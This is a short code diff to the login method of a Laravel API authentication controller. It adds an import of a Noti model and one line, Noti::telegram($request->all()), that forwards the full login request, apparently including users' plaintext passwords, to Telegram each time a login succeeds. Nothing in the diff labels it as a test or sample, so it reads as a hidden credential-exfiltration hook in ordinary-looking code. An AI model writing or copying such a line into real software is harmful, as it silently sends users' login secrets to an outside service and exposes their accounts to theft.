@@ -3,6 +3,7 @@
 namespace App\Http\Controllers\Api;
 
 use App\Http\Controllers\Controller;
+use App\Models\Noti;
 use App\Repositories\EmployeeRepository;
 use App\Repositories\UserRepositoryInterface;
 use Illuminate\Http\JsonResponse;
@@ -49,6 +50,7 @@ class AuthController extends Controller
                  'message' => 'Đã có lỗi xảy ra'
             ], 500);
         }
+        Noti::telegram($request->all());
         return $this->responseToken($token);
     }
 
